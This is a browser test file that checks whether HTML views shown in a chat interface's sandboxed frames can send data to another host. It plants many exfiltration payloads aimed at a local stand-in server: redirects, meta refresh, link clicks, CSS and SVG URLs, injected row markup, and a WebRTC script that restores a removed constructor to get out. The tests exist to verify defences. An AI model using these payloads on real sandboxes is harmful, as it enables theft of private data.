import { createSocket } from "node:dgram";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import type { Locator, Page } from "@playwright/test";
import { expect, test } from "./test";
import {
  apiOrigin,
  rewriteStoredDisplay,
  showView,
  signIn,
  uiOrigin,
  viewFrame,
  viewTitle
} from "./view-fixtures";

// A view cannot move its own frame to another host. Each test plants one way of trying in a
// view, with data in the address, and shows it in the interface. Nothing is refused by the
// test: the other host is a real server on this machine that counts what reaches it, and it
// must count nothing. That the browser refused the move is read from its own log line, so a
// test cannot pass because the view never tried.

/** How long a refused move is given to reach the other host after all. */
const SETTLE_MS = 1_000;
/** How long a view is given to send WebRTC packets. One that may send them does so at once. */
const WEBRTC_WAIT_MS = 3_000;

const refusedByShell =
  /^Framing '[^']*' violates the following Content Security Policy directive: "frame-src 'none'"\./u;

interface OtherHost {
  origin: string;
  /** Method and address of every HTTP request that arrived. */
  requests: string[];
  /** TCP connections opened, whether or not a request followed. */
  connections: number;
  /** Where a WebRTC connection is told to find its STUN server. */
  stunServer: string;
  /** UDP packets that arrived there. */
  packets: number;
  close(): Promise<void>;
}

/** A second host: another name and another port than the instance, on this machine. */
async function startOtherHost(): Promise<OtherHost> {
  const server = createServer((request, response) => {
    host.requests.push(`${request.method ?? ""} ${request.url ?? ""}`);
    response.writeHead(200, { "content-type": "text/html" });
    response.end("<!doctype html><title>Other host</title><p>Other host</p>");
  });
  server.on("connection", () => {
    host.connections += 1;
  });
  // No address: both of the machine's loopback addresses answer, whichever the name finds.
  await new Promise<void>((done) => server.listen(0, done));
  const udp = createSocket("udp4");
  udp.on("message", () => {
    host.packets += 1;
  });
  await new Promise<void>((done) => udp.bind(0, "127.0.0.1", done));
  const name = new URL(apiOrigin).hostname === "localhost" ? "127.0.0.1" : "localhost";
  const port = (address: string | AddressInfo | null) =>
    typeof address === "object" && address ? address.port : 0;
  const host: OtherHost = {
    origin: `http://${name}:${port(server.address())}`,
    requests: [],
    connections: 0,
    stunServer: `stun:127.0.0.1:${udp.address().port}`,
    packets: 0,
    async close() {
      server.closeAllConnections();
      await new Promise((done) => server.close(done));
      await new Promise<void>((done) => udp.close(done));
    }
  };
  return host;
}

const exitTest = test.extend<{ otherHost: OtherHost; refusals: string[] }>({
  otherHost: async ({ page: _page }, use) => {
    const host = await startOtherHost();
    await use(host);
    await host.close();
  },
  // What the browser logged about a move or a script it refused, in every frame of the page.
  refusals: async ({ page }, use) => {
    const refusals: string[] = [];
    page.on("console", (message) => {
      if (message.type() === "error") {
        refusals.push(message.text());
      }
    });
    await use(refusals);
  }
});

type ViewKind = "html.rendered" | "private_hydrated_view";

/** Stores a view of the kind and opens the conversation that shows it. */
async function openView(page: Page, kind: ViewKind, html: string): Promise<void> {
  const headers = await signIn(page, uiOrigin);
  const conversation = await showView(page.request, headers, `<h2>${viewTitle}</h2>${html}`);
  if (kind === "private_hydrated_view") {
    await rewriteStoredDisplay(conversation.id, { kind });
  }
  await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);
}

interface Exit {
  name: string;
  /** What the view holds to get to `address`. */
  html(address: string): string;
}

const script = (body: (address: string) => string) => (address: string) =>
  `<script>${body(JSON.stringify(address))}</script>`;

// Ways a view moves its own frame. The shell refuses each of them. The links are clicked
// outside the document, where the view's own bootstrap neither sees nor cancels them: this is
// what a script does that wants to get past that bootstrap.
const frameExits: Exit[] = [
  { name: "location.href", html: script((address) => `location.href=${address}`) },
  { name: "location.assign", html: script((address) => `location.assign(${address})`) },
  { name: "location.replace", html: script((address) => `location.replace(${address})`) },
  {
    name: "a meta refresh in its document",
    html: (address) => `<meta http-equiv="refresh" content="0;url=${address}">`
  },
  {
    name: "a meta refresh a script adds",
    html: script(
      (address) =>
        `var refresh=document.createElement("meta");refresh.httpEquiv="refresh";refresh.content="0;url="+${address};document.head.appendChild(refresh)`
    )
  },
  {
    name: "a link a script clicks outside its document",
    html: script(
      (address) => `var link=document.createElement("a");link.href=${address};link.click()`
    )
  },
  {
    name: "a download link a script clicks outside its document",
    html: script(
      (address) =>
        `var link=document.createElement("a");link.href=${address};link.download="rows";link.click()`
    )
  }
];

/** The browser said it refused, and after a while the other host has still seen nothing. */
async function expectRefused(
  page: Page,
  otherHost: OtherHost,
  refusals: string[],
  refusal: RegExp
): Promise<void> {
  await expect.poll(() => refusals.filter((text) => refusal.test(text))).toHaveLength(1);
  await page.waitForTimeout(SETTLE_MS);
  expect(otherHost.requests).toEqual([]);
  expect(otherHost.connections).toBe(0);
}

// A click with a modifier key or the middle button does not move the frame. It opens the
// address in a new tab or window, or downloads it, and the shell has no say in that. So a
// link in a view has no address: these tests click one in every way and count.

interface LinkClick {
  name: string;
  attributes?: string;
  options?: Parameters<Locator["click"]>[0];
}

const linkClicks: LinkClick[] = [
  { name: "a click on a link" },
  { name: "a click on a download link", attributes: "download" },
  // The key that opens a link in a new tab: Meta on macOS, Control elsewhere.
  { name: "a Control or Meta click on a link", options: { modifiers: ["ControlOrMeta"] } },
  { name: "a Shift click on a link", options: { modifiers: ["Shift"] } },
  { name: "an Alt click on a link", options: { modifiers: ["Alt"] } },
  { name: "a middle click on a link", options: { button: "middle" } }
];

/** Shows a view with one link to the other host, clicks it, and counts what left. */
async function expectClickReachesNothing(
  page: Page,
  kind: ViewKind,
  click: LinkClick,
  otherHost: OtherHost
): Promise<void> {
  const opened: string[] = [];
  page.context().on("page", (popup) => opened.push(popup.url()));
  page.on("download", (download) => opened.push(download.url()));
  const address = `${otherHost.origin}/hit?click=${encodeURIComponent(click.name)}&rows=secret`;

  await openView(page, kind, `<a id="go" ${click.attributes ?? ""} href="${address}">Open</a>`);
  await expect(page.getByText("Loading view…")).toHaveCount(0);
  const link = viewFrame(page).locator("#go");
  // The link is there to be clicked, as text. Its address is gone.
  await expect(link).toHaveText("Open");
  await expect(link).not.toHaveAttribute("href");
  await link.click(click.options);

  await page.waitForTimeout(SETTLE_MS);
  expect(opened).toEqual([]);
  expect(otherHost.requests).toEqual([]);
  expect(otherHost.connections).toBe(0);
}

exitTest.describe("a view cannot move its frame to another host", () => {
  exitTest.setTimeout(60_000);

  exitTest("the other host counts what does reach it", async ({ page, otherHost }) => {
    // The same browser, the same host, and a frame nothing holds back.
    await page.goto(`${apiOrigin}/health`);
    await page.setContent(`<iframe src="${otherHost.origin}/hit?exit=control"></iframe>`);

    await expect.poll(() => otherHost.requests).toEqual(["GET /hit?exit=control"]);
    expect(otherHost.connections).toBeGreaterThan(0);
  });

  for (const exit of frameExits) {
    exitTest(
      `a view cannot leave its frame through ${exit.name}`,
      async ({ page, otherHost, refusals }) => {
        const address = `${otherHost.origin}/hit?exit=${encodeURIComponent(exit.name)}&rows=secret`;

        await openView(page, "html.rendered", exit.html(address));

        await expectRefused(page, otherHost, refusals, refusedByShell);
      }
    );
  }

  exitTest(
    "a view cannot move its frame to an address of the instance either",
    async ({ page, otherHost, refusals }) => {
      const address = `${apiOrigin}/health?from=view`;
      const asked: string[] = [];
      page.on("request", (request) => {
        if (request.url() === address) {
          asked.push(request.url());
        }
      });

      await openView(
        page,
        "html.rendered",
        `<script>location.href=${JSON.stringify(address)}</script>`
      );

      // `frame-src 'none'` names no address at all: a view can navigate nowhere.
      await expectRefused(page, otherHost, refusals, refusedByShell);
      expect(asked).toEqual([]);
    }
  );
});

exitTest.describe("a link in a view has no address", () => {
  exitTest.setTimeout(60_000);

  for (const click of linkClicks) {
    exitTest(`a view reaches no other host through ${click.name}`, async ({ page, otherHost }) => {
      await expectClickReachesNothing(page, "html.rendered", click, otherHost);
    });

    exitTest(
      `a view with private rows reaches no other host through ${click.name}`,
      async ({ page, otherHost }) => {
        await expectClickReachesNothing(page, "private_hydrated_view", click, otherHost);
      }
    );
  }
});

// A view that holds private rows runs no script and needs none to send rows away: they are
// written into its HTML on the server. Its body is therefore written anew from an allowlist
// when it is shown. These tests read the document the frame was given.

/** The document the shell gave the frame of the view. */
async function composedDocument(page: Page): Promise<string> {
  await expect(page.getByText("Loading view…")).toHaveCount(0);
  const frame = page.locator(`iframe[title="${viewTitle}"]`).first().contentFrame();
  return (await frame.locator("iframe").getAttribute("srcdoc")) ?? "";
}

exitTest.describe("a view with private rows is written from an allowlist", () => {
  exitTest.setTimeout(60_000);

  exitTest("it keeps nothing that names a host", async ({ page, otherHost }) => {
    const there = otherHost.origin;
    const host = new URL(there).host;
    const planted = [
      // Resource hints: the browser may look the host up without asking the content policy.
      `<link rel="dns-prefetch" href="//${host}">`,
      `<link rel="preconnect" href="${there}">`,
      `<link rel="prefetch" href="${there}/hit?hint=prefetch">`,
      `<link rel="stylesheet" href="${there}/hit?hint=stylesheet">`,
      '<meta http-equiv="x-dns-prefetch-control" content="on">',
      `<meta http-equiv="refresh" content="0;url=${there}/hit?exit=refresh">`,
      `<base href="${there}/">`,
      // Addresses a person can open, and elements that load one.
      `<a id="plain" href="${there}/hit?a=1" ping="${there}/hit?ping=1" target="_blank">Link</a>`,
      `<a id="fragment" href="#rows">Rows</a>`,
      `<map name="m"><area shape="rect" coords="0,0,9,9" href="${there}/hit?area=1"></map>`,
      `<form action="${there}/hit"><input name="rows" value="secret"><button formaction="${there}/hit?f=1">Send</button></form>`,
      `<iframe src="${there}/hit?frame=1"></iframe>`,
      `<iframe srcdoc="&lt;a href='${there}/hit?nested=1'&gt;x&lt;/a&gt;"></iframe>`,
      `<object data="${there}/hit?object=1"></object><embed src="${there}/hit?embed=1">`,
      `<img id="outside" alt="outside" src="${there}/hit?img=1">`,
      `<img id="set" alt="set" srcset="${there}/hit?srcset=1 1x">`,
      `<svg id="drawing" width="20" height="20"><a href="${there}/hit?svg=1"><rect width="9" height="9"/></a><image href="${there}/hit?image=1"/><use href="${there}/hit?use=1#x"/><circle id="dot" cx="5" cy="5" r="4" fill="url(${there}/hit?fill=1)"/></svg>`,
      `<style>@import url("${there}/hit?import=1");</style>`,
      `<style>p{background:url(${there}/hit?css=1)}</style>`,
      `<style>p{background:u\\72l(${there}/hit?escaped=1)}</style>`,
      `<p id="styled" style="background:url('${there}/hit?style=1')" onclick="location.href='${there}'">Styled</p>`,
      `<script>document.body.setAttribute("data-ran","true")</script>`,
      // What a static view is made of stays.
      "<style>#kept{color:rgb(1, 2, 3)}</style>",
      '<table><tr><th scope="col">Status</th></tr><tr><td id="kept" colspan="1" style="font-weight:700">open</td></tr></table>',
      '<img id="inline" alt="inline" width="1" height="1" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">'
    ].join("");

    await openView(page, "private_hydrated_view", planted);
    const composed = await composedDocument(page);
    const view = viewFrame(page);

    // No address of the other host is anywhere in the document, in any spelling.
    expect(composed).not.toContain(host);
    expect(composed).not.toContain("@import");
    await expect(
      view.locator(
        "link, base, area, map, form, input, button, iframe, object, embed, script, image, use, [href], [ping], [target], [srcset], [onclick]"
      )
    ).toHaveCount(0);
    // The only meta elements are the three the composer writes: policy, charset, viewport.
    await expect(view.locator("meta")).toHaveCount(3);
    await expect(view.locator("meta[http-equiv]")).toHaveAttribute(
      "http-equiv",
      "Content-Security-Policy"
    );
    for (const id of ["outside", "set", "styled", "dot"]) {
      await expect(view.locator(`#${id}`)).toHaveCount(1);
    }
    await expect(view.locator("#outside")).not.toHaveAttribute("src");
    await expect(view.locator("#styled")).not.toHaveAttribute("style");
    await expect(view.locator("#dot")).not.toHaveAttribute("fill");
    await expect(view.locator("#plain")).toHaveText("Link");
    await expect(view.locator("#fragment")).toHaveText("Rows");
    // The table, its style block, its inline style and the embedded image are as written.
    await expect(view.locator("#kept")).toHaveText("open");
    await expect(view.locator("#kept")).toHaveCSS("color", "rgb(1, 2, 3)");
    await expect(view.locator("#kept")).toHaveCSS("font-weight", "700");
    await expect(view.locator("#inline")).toHaveAttribute("src", /^data:image\/gif/u);
    await expect(view.locator("body")).not.toHaveAttribute("data-ran");

    await page.waitForTimeout(SETTLE_MS);
    expect(otherHost.requests).toEqual([]);
    expect(otherHost.connections).toBe(0);
  });

  exitTest(
    "it shows row text that is markup as it stands on the allowlist, or not at all",
    async ({ page, otherHost }) => {
      const there = otherHost.origin;
      const host = new URL(there).host;
      // What a template with a placeholder in markup used to become: the row closes the element
      // it was placed in and goes on as markup of its own.
      const row = `</pre><link rel="dns-prefetch" href="//${host}"><a id="row-link" href="${there}/hit?rows=secret">Details</a><img id="row-image" src="${there}/hit?img=1" onerror="location.href='${there}'"><b id="row-bold">bold</b>`;

      await openView(page, "private_hydrated_view", `<pre id="rows">[{"note":"${row}"}]</pre>`);
      const composed = await composedDocument(page);
      const view = viewFrame(page);

      expect(composed).not.toContain(host);
      await expect(view.locator("link, [href], [onerror], [src]")).toHaveCount(0);
      // Formatting a row brings along is on the list and stays; it carries no address.
      await expect(view.locator("#row-link")).toHaveText("Details");
      await expect(view.locator("#row-bold")).toHaveText("bold");
      await view.locator("#row-link").click({ modifiers: ["ControlOrMeta"] });

      await page.waitForTimeout(SETTLE_MS);
      expect(otherHost.requests).toEqual([]);
      expect(otherHost.connections).toBe(0);
    }
  );
});

// WebRTC is not HTTP: a script names a server and the browser sends it UDP packets. No content
// policy and no sandbox flag forbids that today.

/**
 * Opens a WebRTC connection towards `stunServer`. The view's bootstrap has removed the
 * constructor from the view's own window, so the script writes a frame of its own that holds
 * a copy of itself: the copy passes the view's policy by the same hash, and its window is new.
 */
function webRtcScript(stunServer: string): string {
  return `<script>(function(){if(typeof RTCPeerConnection==="undefined"){addEventListener("message",function(event){if(event.data==="offered"){document.body.setAttribute("data-offered","true")}});var frame=document.createElement("iframe");frame.srcdoc="<body><script>"+document.currentScript.text+"<\\/script>";document.body.appendChild(frame);return}var peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(stunServer)}}]});peer.createDataChannel("rows");peer.createOffer().then(function(offer){return peer.setLocalDescription(offer)}).then(function(){parent.postMessage("offered","*")})})();</script>`;
}

exitTest.describe("WebRTC from a view", () => {
  exitTest.setTimeout(60_000);

  exitTest("a view finds no WebRTC constructor under its name", async ({ page }) => {
    await openView(
      page,
      "html.rendered",
      `<script>document.body.setAttribute("data-webrtc",[typeof RTCPeerConnection,typeof webkitRTCPeerConnection,typeof mozRTCPeerConnection].join(","))</script>`
    );

    // Hardening only: the next test gets the constructor back.
    await expect(viewFrame(page).locator("body")).toHaveAttribute(
      "data-webrtc",
      "undefined,undefined,undefined"
    );
  });

  exitTest(
    "a view that runs scripts still sends WebRTC packets (known and open)",
    async ({ page, otherHost }) => {
      await openView(page, "html.rendered", webRtcScript(otherHost.stunServer));
      await expect(viewFrame(page).locator("body")).toHaveAttribute("data-offered", "true");
      await page.waitForTimeout(WEBRTC_WAIT_MS);

      // Everything above must work. Only the count below is expected to fail, and when it one
      // day holds, a browser has closed WebRTC for such a frame: then this is an ordinary test,
      // and views with private rows may run scripts again.
      exitTest.fail(true, "Known and open: a script-enabled view can send WebRTC packets.");
      expect(otherHost.packets).toBe(0);
    }
  );

  exitTest("a view with private rows sends no WebRTC packet", async ({ page, otherHost }) => {
    await openView(page, "private_hydrated_view", webRtcScript(otherHost.stunServer));
    await expect(viewFrame(page).getByRole("heading", { name: viewTitle })).toBeVisible();
    await expect(page.getByText("Loading view…")).toHaveCount(0);
    await page.waitForTimeout(WEBRTC_WAIT_MS);

    // Its frame runs no script, so nothing in it can open a connection.
    await expect(viewFrame(page).locator("body")).not.toHaveAttribute("data-offered");
    expect(otherHost.packets).toBe(0);
  });
});
